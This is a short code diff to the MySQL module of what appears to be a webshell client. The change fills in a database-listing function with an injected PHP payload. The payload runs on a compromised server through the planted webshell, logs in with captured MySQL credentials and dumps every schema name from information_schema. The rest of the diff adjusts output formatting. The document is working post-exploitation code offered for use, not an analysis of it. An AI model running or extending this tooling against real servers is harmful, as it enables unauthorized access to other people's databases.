@@ -83,15 +83,15 @@ class Mysql():
             Log.error("Error occured!")
 
     def get_databases(self):
-        if self.databases != None:
+        if len(self.databases) != 0:
             Log.success(list2string(self.databases, "\t", "\n"))
             return
-        result = self.webshell.php_code_exec("");
+        result = self.webshell.php_code_exec("error_reporting(0);$h='%s';$u='%s';$p='%s';$c=new Mysqli($h,$u,$p);$c->select_db('information_schema');$s='select schema_name from information_schema.schemata';$r=$c->query($s); while($d=$r->fetch_array(MYSQLI_NUM)){echo $d[0].',';}$c->close();" % (self.ip, self.username, self.password));
         if result[0]:
             content = result[1]
-            databases = content.split(",")
+            databases = content.split(",")[0:-1]
             self.databases = databases
-            Log.success(list2string(databases, "\t", "\n"))
+            Log.success("Database : \n" + list2string(databases, "=> [", "]\n"))
         else:
             Log.error("Error occured!")
 
